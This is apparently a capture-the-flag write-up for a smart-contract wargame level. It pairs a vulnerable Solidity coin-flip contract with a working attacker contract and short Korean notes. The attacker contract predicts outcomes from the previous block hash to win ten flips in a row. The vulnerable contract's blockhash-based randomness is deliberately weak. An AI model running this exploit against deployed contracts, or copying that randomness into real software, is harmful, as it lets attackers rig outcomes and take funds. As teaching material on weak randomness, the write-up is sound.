// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

// 해킹 컨트랙트

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract CoinFlipAttacker {
    ICoinFlip public target;

    // 인스턴스 주소로 설정
    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attackOnce() external {
        // CoinFlip과 동일한 상수
        uint256 FACTOR =
            57896044618658097711785492504343953926634992332820282019728792003956564819968;

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;   // 0 또는 1
        bool guess = (coinFlip == 1);

        // 같은 블록에서 두 번 호출하면 타깃의 lastHash 체크로 revert됨
        bool ok = target.flip(guess);
        require(ok, "flip failed");
    }

    function wins() external view returns (uint256) {
        return target.consecutiveWins();
    }
}

/*
취약점
고정된 FACTOR값과 blockhash(block.number - 1)을 사용하여 coinflip의 결과가 예측가능해져버렸다

풀이
1. 위 해킹 컨트랙트를 배포하고 attackOnce() 함수를 반복 호출한다.
2. wins() 함수의 반환값이 10이 될때까지 attacOnce() 함수 호출
끝
*/